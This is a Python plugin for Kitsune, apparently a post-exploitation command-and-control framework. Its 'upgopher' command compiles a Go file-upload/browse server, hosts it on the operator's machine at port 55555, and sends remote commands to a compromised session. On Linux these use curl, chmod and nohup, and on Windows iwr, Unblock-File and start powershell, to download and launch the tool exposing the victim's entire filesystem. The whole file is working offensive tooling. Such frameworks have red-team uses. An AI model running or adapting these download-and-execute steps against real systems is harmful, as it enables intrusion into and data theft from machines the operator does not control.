#!/usr/bin/python3
#=========================#
#  Kitsune by @JoelGMSec  #
#      darkbyte.net       #
#=========================#

import os
import sys
import time
import json
import atexit
import threading
import subprocess

sys.dont_write_bytecode = True

def get_description():
    return "This module adds UpGopher to custom commands"

def main(app, caller, session, command):
    if caller == "command" and command == "help":
        return "- upgopher: Execute UpGopher on current session and return URL:PORT"
    
    if caller == "command" and command == "upgopher":
        def get_localip():
            try:
                result = subprocess.run(
                    ["ip", "a"], capture_output=True, text=True, check=True
                )
                lines = result.stdout.splitlines()
                for line in lines:
                    if "inet " in line and "127.0.0.1" not in line and "inet6" not in line:
                        ipaddr = line.split()[1].split('/')[0]
                        return ipaddr
            except:
                pass

            return None

        def get_ipaddress(session):
            try:
                with open('data/sessions.json', 'r') as f:
                    sessions = json.load(f)
                    for session_id in sessions:
                        if str(session_id['Session']) == str(session.split()[1]):
                            session_ip = session_id['IP Address']
                            return session_ip
            except:
                pass

            return None

        def get_type(session):
            try:
                with open('data/sessions.json', 'r') as f:
                    sessions = json.load(f)
                    for session_id in sessions:
                        if str(session_id['Session']) == str(session.split()[1]):
                            session_type = session_id['Process']
                            return session_type
            except:
                pass

            return None

        def run_delivery(app, port, path):
            command = [os.sys.executable, '-m', 'http.server', '--bind', "0.0.0.0", '-d', path, str(port)]
            return subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        def delivery_thread(app, port, path):
            app.tmp_delivery_process = run_delivery(app, port, path)
            return app.tmp_delivery_process

        def run_step(app, step_name, output_list):
            try:
                if step_name.startswith("local:"):
                    cmd = "".join(step_name.split("local:")[1:]).strip()
                    subprocess.run(cmd, shell=True, check=True)
                
                elif step_name.startswith("close:"):
                    time.sleep(30)
                    if app.tmp_delivery_process:
                        app.tmp_delivery_process.terminate()

                else:
                    output_list.append(step_name)
            except:
                pass

        try:
            local_ip = get_localip()
            session_type = get_type(session)

            if not ".exe" in session_type:
                custom_step1 = 'remote: curl -s http://' + str(local_ip) + ':55555/upgopher -o /tmp/upgopher'
                custom_step2 = 'remote: echo "sleep 3 ; chmod +x /tmp/upgopher ; /tmp/upgopher -dir \"/\"" > /tmp/upgopher.sh'
                custom_step3 = 'remote: chmod +x /tmp/upgopher.sh ; nohup /bin/sh -c /tmp/upgopher.sh &'
            
            if ".exe" in session_type:
                custom_step1 = 'remote: sleep 3 ; iwr -useb http://'+ str(local_ip) + ':55555/upgopher.exe -outfile "$env:temp\\upgopher.exe"'
                custom_step2 = 'remote: Unblock-File "$env:temp\\upgopher.exe" 2>&1> $null'
                custom_step3 = 'remote: start powershell "$env:temp\\upgopher.exe -dir C:/"'

            app.tmp_delivery_process = None
            delivery_thread_instance = threading.Thread(target=delivery_thread, args=(app, "55555", "custom/upgopher/"))
            delivery_thread_instance.daemon = True
            delivery_thread_instance.start()
        
            threads = []
            output_list = []
            steps = [
                'print: "[+] Loading Custom Module: UpGopher"',
                'local: cd custom/upgopher/ && go build upgopher.go > /dev/null 2>&1',
                'local: cd custom/upgopher/ && env GOOS=windows GOARCH=amd64 go build upgopher.go > /dev/null 2>&1',
                'print: "- Step 1: Build Go Solution.. OK!"',
                 str(custom_step1), str(custom_step2), str(custom_step3),
                'print: "- Step 2: Transfer UpGopher.. OK!"', 
                'print: "- Step 3: Run UpGopher on remote session.. OK!"',
                'close: delivery_thread_instance'
            ]

            for step in steps:
                thread = threading.Thread(target=run_step, args=(app, step, output_list))
                threads.append(thread)
                thread.start()

            session_ip = get_ipaddress(session)
            if session_ip:
                output_list.append(f'print: "[+] Done! You can access to UpGopher on http://{session_ip}:9090"')
            else:
                output_list.append("[!] Error: Could not retrieve session IP address")

            atexit.register(app.tmp_delivery_process.terminate)
            output_list = "\n".join(output_list).strip()
            return output_list

        except:
            if app.tmp_delivery_process:
                app.tmp_delivery_process.terminate()
            return None

    return None
